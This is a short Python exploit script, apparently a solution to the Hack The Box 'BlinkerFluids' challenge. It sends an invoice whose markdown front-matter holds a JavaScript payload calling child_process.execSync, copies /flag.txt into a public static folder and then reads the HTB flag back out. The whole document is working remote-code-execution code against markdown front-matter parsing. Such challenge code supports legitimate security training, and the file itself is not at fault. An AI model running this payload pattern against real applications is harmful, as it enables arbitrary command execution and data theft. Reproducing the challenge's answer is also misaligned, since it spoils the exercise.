import sys
import requests
import re
import json
from urllib.parse import urljoin

if len(sys.argv) != 2:
    print("Usage: python3 BlinkerFluids.py ip:port")
    sys.exit(1)

host = sys.argv[1]
base = f"http://{host}/"

api_url = urljoin(base, "api/invoice/add")
flag_url = urljoin(base, "static/flag.txt")

#RCE payload copies a flag to available path.
payload = {
    "markdown_content": "---js\n((require(\"child_process\")).execSync(\"cp /flag.txt /app/static/\"))\n---"
}

headers = {
    "Content-Type": "application/json"
}

try:
    r = requests.post(api_url, data=json.dumps(payload), headers=headers, timeout=5)

    if r.status_code != 200:
        print("Invoice creation failed.")
        sys.exit(1)

    r = requests.get(flag_url, timeout=5)
    flag = re.search(r"HTB\{.*?\}", r.text)

    if flag:
        print("Flag:", flag.group(0))
    else:
        print("Flag not found.")
except Exception as e:
    print(f"Exploit failed: {e}")
    sys.exit(1)
